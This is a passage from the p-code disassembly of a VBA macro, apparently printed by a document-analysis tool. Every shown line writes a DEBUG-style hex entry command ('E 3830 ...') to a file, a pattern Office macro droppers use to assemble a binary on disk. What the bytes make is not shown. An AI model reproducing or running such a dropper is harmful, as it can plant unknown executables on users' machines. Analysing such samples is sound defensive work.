' 	LitStr 0x0036 "E 3830 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 8F 98 DC 89 93"
' 	PrintItemNL 
' Line #1094:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3840 D9 8D 98 DC 88 93 CF 8D 9A C8 E1 EC FF F5 FB FF"
' 	PrintItemNL 
' Line #1095:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3850 FD FF FF FE FD F9 84 FA F6 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1096:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3860 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1097:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3870 EF 09 F7 EF 09 F7 EF 09 F7 EF 06 7E 7A 03 07 08"
' 	PrintItemNL 
' Line #1098:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3880 35 3C 3F 40 49 4D 42 4C 53 3A 6F 73 09 F7 EF 09"
' 	PrintItemNL 
' Line #1099:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3890 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1100:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 38A0 EF 1D 7B 78 11 C7 C0 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1101:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 38B0 09 F7 EF 09 F7 EF 09 F7 EF 17 CE CA 47 53 5D 16"
' 	PrintItemNL 
' Line #1102:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 38C0 23 2B 24 2F 33 37 40 43 3E 45 48 46 4B 4E 3E 43"
' 	PrintItemNL 
' Line #1103:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 38D0 46 00 00 03 00 00 F8 FB F9 E9 EC EA DC DE DE D1"
' 	PrintItemNL 
' Line #1104:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 38E0 D3 D3 BF C3 C4 B2 B6 B7 01 06 09 70 75 78 4E 54"
' 	PrintItemNL 
' Line #1105:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 38F0 59 45 4B 50 66 6E 75 6E 76 7D 4E 57 60 09 F7 EF"
' 	PrintItemNL 
' Line #1106:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3900 09 F7 EF 09 F7 EF 4A 53 5C 52 5B 64 61 6A 73 5F"
' 	PrintItemNL 
' Line #1107:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3910 68 71 29 B3 B3 09 F7 EF 09 F7 EF 25 AF AF 55 5C"
' 	PrintItemNL 
' Line #1108:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3920 65 2A B3 B3 09 F7 EF 09 F7 EF 09 F7 EF 41 82 87"
' 	PrintItemNL 
' Line #1109:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3930 5C 63 6C 53 5C 65 59 62 6B 57 62 6A 1E C5 C2 09"
' 	PrintItemNL 
' Line #1110:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3940 F7 EF 09 F7 EF 1F C6 C2 4D 51 56 3E 3E 44 1B 1A"
' 	PrintItemNL 
' Line #1111:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3950 1E 02 00 03 04 00 01 0D 08 0A A1 9F 9F 3A ED E7"
' 	PrintItemNL 
' Line #1112:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3960 09 F7 EF 09 F7 EF 63 FA F5 7D F7 F4 7F F8 F3 82"
' 	PrintItemNL 
' Line #1113:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3970 FA F6 80 F8 F7 7F F8 F7 54 CE DF 39 B5 CE 47 C3"
' 	PrintItemNL 
' Line #1114:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3980 E1 4A C7 E6 09 F7 EF 09 F7 EF 2B E1 EB 95 A1 E1"
' 	PrintItemNL 
' Line #1115:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3990 5C BF E5 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 90"
' 	PrintItemNL 
' Line #1116:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 39A0 9A DA 89 94 D8 8E 9B DF 89 95 D5 7B 88 BC C2 CD"
' 	PrintItemNL 
' Line #1117:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 39B0 ED F4 FB FF FA FC FD FF FF FC 84 F8 F5 09 F7 EF"
' 	PrintItemNL 
' Line #1118:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 39C0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 08 DA D3 07"
' 	PrintItemNL 
' Line #1119:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 39D0 BA B4 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 E9"
' 	PrintItemNL 
' Line #1120:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 39E0 E1 01 10 10 2B 30 33 3B 44 48 40 4A 51 44 4E 55"
' 	PrintItemNL 
' Line #1121:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 39F0 30 66 6A 18 95 93 0E A5 A0 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1122:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3A00 F7 EF 09 F7 EF 27 68 66 27 32 30 14 91 8C 09 F7"
' 	PrintItemNL 
' Line #1123:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3A10 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 1F D6 D3"
' 	PrintItemNL 
' Line #1124:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3A20 5C 6C 78 2D 3C 45 1B 27 2B 2F 38 3B 3E 45 48 48"
' 	PrintItemNL 
' Line #1125:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3A30 4D 50 3F 44 47 00 02 05 00 00 F6 F9 F7 EB EE EC"
' 	PrintItemNL 
' Line #1126:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3A40 DC DE DE CF D1 D1 BF C3 C4 B3 B7 B8 01 06 09 72"
' 	PrintItemNL 
' Line #1127:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3A50 77 7A 69 6F 74 44 4A 4F 51 59 60 62 6A 71 40 74"
' 	PrintItemNL 
' Line #1128:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3A60 7A 09 F7 EF 09 F7 EF 11 E4 DE 4D 56 5F 5B 64 6D"
' 	PrintItemNL 
' Line #1129:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3A70 60 69 72 58 61 6A 34 A2 A4 09 F7 EF 09 F7 EF 11"
' 	PrintItemNL 
' Line #1130:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3A80 E3 DD 49 50 59 11 E3 DD 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1131:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3A90 EF 44 77 7C 5B 62 6B 50 57 60 5C 65 6E 5B 66 6E"
' 	PrintItemNL 
' Line #1132:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3AA0 29 A6 A6 09 F7 EF 09 F7 EF 19 CE CA 4C 50 55 3D"
' 	PrintItemNL 
' Line #1133:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3AB0 3D 43 23 22 26 06 00 05 09 02 05 23 1E 20 BD B8"
' 	PrintItemNL 
' Line #1134:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3AC0 B9 5C E2 DE 09 F7 EF 09 F7 EF B7 F8 F9 EF F6 F9"
' 	PrintItemNL 
' Line #1135:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3AD0 F7 FC FA F0 F5 F4 FA FC FF E3 E6 FF 76 7C AB 74"
' 	PrintItemNL 
' Line #1136:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3AE0 7E BA 85 90 D4 89 95 DB 09 F7 EF 09 F7 EF 2C E2"
' 	PrintItemNL 
' Line #1137:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3AF0 EB 97 A3 E3 6D B4 E3 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1138:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3B00 09 F7 EF 94 A1 DF 8A 98 DA 8C 98 DE 8B 98 DC 80"
' 	PrintItemNL 
' Line #1139:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3B10 8C C6 9B A4 CA F4 F9 FF FC FC FF FF FF FE 83 FB"
' 	PrintItemNL 
' Line #1140:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3B20 F6 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1141:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3B30 07 BA B6 00 00 03 05 3E 3C 09 E9 E1 09 F7 EF 09"
' 	PrintItemNL 
' Line #1142:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3B40 F7 EF 09 F7 EF 04 7C 78 2A 2F 32 3C 45 49 42 4A"
' 	PrintItemNL 
' Line #1143:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3B50 51 40 4A 51 38 44 4A 27 32 36 0D 4E 4B 09 F7 EF"
' 	PrintItemNL 
' Line #1144:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3B60 09 F7 EF 09 F7 EF 09 F7 EF 23 65 61 25 30 2E 20"
' 	PrintItemNL 
' Line #1145:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3B70 2D 2B 22 4B 4B 14 CB C6 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1146:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3B80 EF 1A D1 CE 49 5A 67 4A 5A 66 22 2E 34 2C 35 38"
' 	PrintItemNL 
' Line #1147:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3B90 3C 43 46 44 49 4C 39 3E 41 00 04 07 00 00 F2 F5"
' 	PrintItemNL 
' Line #1148:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3BA0 F3 EC EF ED DD DF DF CE D0 D0 BF C3 C4 B2 B6 B7"
' 	PrintItemNL 
' Line #1149:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3BB0 00 01 04 6A 6F 72 77 7D 82 5A 60 65 4E 56 5D 55"
' 	PrintItemNL 
' Line #1150:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3BC0 5D 64 3F 81 86 09 F7 EF 09 F7 EF 1B D1 CD 4B 56"
' 	PrintItemNL 
' Line #1151:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3BD0 5E 5E 69 71 5A 65 6D 4D 58 60 47 7D 82 09 F7 EF"
' 	PrintItemNL 
' Line #1152:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3BE0 09 F7 EF 09 F7 EF 1E C4 C2 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1153:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3BF0 F7 EF 09 F7 EF 4A 4F 58 54 59 62 43 4A 53 50 59"
' 	PrintItemNL 
' Line #1154:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3C00 62 55 60 68 27 A4 A4 09 F7 EF 09 F7 EF 0C ED E6"
' 	PrintItemNL 
' Line #1155:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3C10 45 49 4E 34 34 3A 16 12 17 04 00 03 0E 07 0A 7B"
' 	PrintItemNL 
' Line #1156:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3C20 76 78 E2 DD DE 78 F0 EC 09 F7 EF 09 F7 EF AF F2"
' 	PrintItemNL 
' Line #1157:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3C30 F3 F5 FC FF F8 FD FB F3 F8 F7 FA FB FF B5 B7 D6"
' 	PrintItemNL 
' Line #1158:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3C40 69 6D A2 7E 86 C9 81 8B D1 88 94 DA 09 F7 EF 09"
' 	PrintItemNL 
' Line #1159:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3C50 F7 EF 2C E2 EB 95 9F DF 6D B2 E1 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1160:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3C60 EF 09 F7 EF 09 F7 EF 94 A2 DC 8D 9B DD 87 96 DB"
' 	PrintItemNL 
' Line #1161:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3C70 8A 98 E0 87 94 D2 83 8C B8 DB E0 F9 FF FC FF FF"
' 	PrintItemNL 
' Line #1162:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3C80 FC FB 84 FB F7 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1163:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3C90 EF 09 F7 EF 07 BA B6 00 00 03 04 00 00 07 2F 2D"
' 	PrintItemNL 
' Line #1164:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3CA0 09 E8 E1 09 F7 EF 09 F7 EF 09 E9 E1 25 39 3B 35"
' 	PrintItemNL 
' Line #1165:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3CB0 3E 42 3A 42 49 36 40 47 36 42 48 29 34 38 0F 4F"
' 	PrintItemNL 
' Line #1166:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3CC0 4D 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 19 5B 57"
' 	PrintItemNL 
' Line #1167:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3CD0 1F 2A 28 28 35 33 34 41 43 31 40 43 2D 75 78 0F"
' 	PrintItemNL 
' Line #1168:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3CE0 B8 B5 0A EB E4 2A 82 88 33 46 55 3B 4C 59 2A 38"
' 	PrintItemNL 
' Line #1169:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3CF0 3E 28 31 34 36 3D 40 39 3E 41 2E 33 36 00 02 05"
' 	PrintItemNL 
' Line #1170:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3D00 00 00 F1 F1 F1 EC EE EE DE E0 E0 CD CF CF C1 C3"
' 	PrintItemNL 
' Line #1171:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3D10 C3 B1 B6 B5 00 00 01 60 65 68 68 6F 72 63 69 6E"
' 	PrintItemNL 
' Line #1172:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3D20 4A 52 59 45 4D 54 3A 7D 80 09 F7 EF 09 F7 EF 19"
' 	PrintItemNL 
' Line #1173:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3D30 CF CA 47 52 5A 5B 68 70 54 5F 67 44 4F 57 55 60"
' 	PrintItemNL 
' Line #1174:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3D40 68 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1175:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3D50 09 F7 EF 09 F7 EF 0C EC E5 40 45 4E 49 4E 57 38"
' 	PrintItemNL 
' Line #1176:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3D60 3D 46 40 49 52 4B 56 5E 24 A1 A1 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1177:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3D70 EF 09 F7 EF 3D 41 46 29 2A 2E 14 13 17 02 00 01"
' 	PrintItemNL 
' Line #1178:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3D80 04 00 01 C1 BC BD F3 F1 F1 84 FB F7 09 F7 EF 09"
' 	PrintItemNL 
' Line #1179:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3D90 F7 EF B5 F7 F5 F8 FF FF F7 FD FC F8 FE FF ED F2"
' 	PrintItemNL 
' Line #1180:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3DA0 FF 84 89 B0 6A 70 AB 7F 88 CB 7B 88 CC 85 95 D7"
' 	PrintItemNL 
' Line #1181:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3DB0 09 F7 EF 09 F7 EF 2B E0 EA 91 9C DA 7C A5 DB 09"
' 	PrintItemNL 
' Line #1182:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3DC0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 6C B3 DC 8F 9E"
' 	PrintItemNL 
' Line #1183:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3DD0 DC 86 96 D8 87 96 DB 89 96 D4 80 8A BA B8 BD DC"
' 	PrintItemNL 
' Line #1184:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3DE0 F8 FA FF FC FA FA 83 F9 F3 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1185:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3DF0 F7 EF 09 F7 EF 09 F7 EF 07 BA B5 00 00 03 03 01"
' 	PrintItemNL 
' Line #1186:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3E00 01 04 00 00 06 6C 69 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1187:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3E10 13 8D 8A 28 31 35 2F 38 3C 30 3B 3F 3C 47 4B 35"
' 	PrintItemNL 
' Line #1188:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3E20 3E 41 12 52 50 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1189:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3E30 EF 13 58 55 17 25 24 2A 37 39 1F 2E 31 2D 3D 43"
' 	PrintItemNL 
' Line #1190:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3E40 4C 5C 62 3E 50 57 1E 30 3B 3E 51 5E 48 5C 6D 3D"
' 	PrintItemNL 
' Line #1191:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3E50 50 5F 2A 3A 41 1F 2B 2F 2F 38 3C 30 36 3B 24 2B"
' 	PrintItemNL 
' Line #1192:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3E60 2E 00 00 01 00 00 F7 F4 F6 ED ED ED DE DE DE CF"
' 	PrintItemNL 
' Line #1193:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3E70 D2 D0 C5 C8 C6 B6 BB B9 00 01 00 5C 62 61 56 5D"
' 	PrintItemNL 
' Line #1194:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3E80 60 5E 65 68 58 61 65 35 3E 42 24 A1 9F 09 F7 EF"
' 	PrintItemNL 
' Line #1195:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3E90 09 F7 EF 1A D1 CB 53 5E 66 60 6A 74 58 62 6C 50"
' 	PrintItemNL 
' Line #1196:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3EA0 5A 64 4B 54 5E 1A CF CC 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1197:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3EB0 EF 09 F7 EF 09 F7 EF 09 F7 EF 1B CF CB 49 4B 56"
' 	PrintItemNL 
' Line #1198:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3EC0 42 44 4F 42 47 50 42 4B 54 41 4D 53 25 93 93 09"
' 	PrintItemNL 
' Line #1199:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3ED0 F7 EF 09 F7 EF 09 F7 EF 29 5A 5B 27 2A 2E 08 09"
' 	PrintItemNL 
' Line #1200:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3EE0 0D 05 07 08 04 03 05 F2 F0 F0 FF FD FD 7F F5 F1"
' 	PrintItemNL 
' Line #1201:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3EF0 09 F7 EF 09 F7 EF BC FB F4 EF F6 F3 F3 FC FF F3"
' 	PrintItemNL 
' Line #1202:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3F00 FA FF B8 C1 E6 54 5F 91 75 80 BE 7B 89 CB 7F 91"
' 	PrintItemNL 
' Line #1203:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3F10 CC 82 95 CE 28 E0 E8 09 F7 EF 29 E0 E9 8F 9C DA"
' 	PrintItemNL 
' Line #1204:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3F20 8E 9F D8 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 6B"
' 	PrintItemNL 
' Line #1205:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3F30 B4 DC 89 9C D5 88 9C D5 89 9B D8 8B 9B D6 86 91"
' 	PrintItemNL 
' Line #1206:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3F40 C5 8B 94 BA F0 F8 FF F5 FD FD 80 FB F3 09 F7 EF"
' 	PrintItemNL 
' Line #1207:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3F50 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 07 BC B8 00"
' 	PrintItemNL 
' Line #1208:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3F60 04 09 00 00 01 03 04 02 04 01 00 08 BA B4 09 F7"
' 	PrintItemNL 
' Line #1209:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3F70 EF 09 F7 EF 0A DC D5 25 2E 31 29 32 35 27 30 33"
' 	PrintItemNL 
' Line #1210:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3F80 30 35 38 34 39 3A 18 59 57 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1211:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3F90 F7 EF 09 F7 EF 0B 53 53 0A 1A 20 07 17 1E 17 26"
' 	PrintItemNL 
' Line #1212:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3FA0 2F 3C 4C 53 4C 5C 63 42 54 5B 41 53 5E 34 47 54"
' 	PrintItemNL 
' Line #1213:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3FB0 4C 60 72 68 7C 8E 4B 5D 68 1F 2E 37 1E 2D 36 10"
' 	PrintItemNL 
' Line #1214:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3FC0 1C 22 30 39 3C 00 01 00 00 00 F7 F4 F6 EE EE EE"
' 	PrintItemNL 
' Line #1215:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3FD0 DF E0 DE CF D2 D0 C4 C8 C3 B6 BC B7 00 01 00 60"
' 	PrintItemNL 
' Line #1216:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3FE0 66 65 5E 65 68 5C 65 69 67 70 74 4F 5A 5E 24 A1"
' 	PrintItemNL 
' Line #1217:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 3FF0 9F 09 F7 EF 09 F7 EF 18 CF C9 57 62 6A 60 69 73"
' 	PrintItemNL 
' Line #1218:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4000 51 5A 64 43 4C 56 47 50 5A 30 AA AC 09 F7 EF 09"
' 	PrintItemNL 
' Line #1219:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4010 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 1C CF"
' 	PrintItemNL 
' Line #1220:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4020 CC 4E 50 5A 44 45 4F 35 37 41 45 4D 54 39 43 4A"
' 	PrintItemNL 
' Line #1221:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4030 24 68 69 09 F7 EF 09 F7 EF 09 F7 EF 2B 6B 6B 24"
' 	PrintItemNL 
' Line #1222:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4040 29 2C 0A 0E 0F 00 00 01 8C 8E 8E FC FC FC F7 F5"
' 	PrintItemNL 
' Line #1223:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4050 F4 AA F4 F0 09 F7 EF 09 F7 EF BC FB F1 F8 FF FA"
' 	PrintItemNL 
' Line #1224:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4060 F4 FD FF ED F7 FF 85 90 BC 54 60 9A 77 85 C7 7E"
' 	PrintItemNL 
' Line #1225:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4070 8E D0 7E 92 CB 7C 90 C7 27 DE E6 09 F7 EF 2B E2"
' 	PrintItemNL 
' Line #1226:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4080 EB 8F 9E DC 8A 9B D3 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1227:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4090 09 F7 EF 68 B0 D9 84 98 CF 84 99 D0 88 9A D5 8B"
' 	PrintItemNL 
' Line #1228:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
